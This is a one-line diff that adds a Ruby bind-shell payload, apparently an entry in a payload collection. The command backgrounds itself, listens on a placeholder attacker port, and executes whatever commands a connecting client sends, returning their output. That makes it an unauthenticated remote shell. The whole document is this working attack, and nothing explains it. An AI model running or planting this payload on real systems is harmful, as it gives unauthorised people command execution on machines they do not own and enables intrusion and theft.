@@ -1,0 +1,1 @@
+ruby -rsocket -e "exit if fork;s=TCPServer.new(ATTACKER-PORT);loop do;c=s.accept();while(c.print '$';s2=c.gets);puts s2;IO.popen(s2,'r'){|s3|c.print s3.read};end;end"
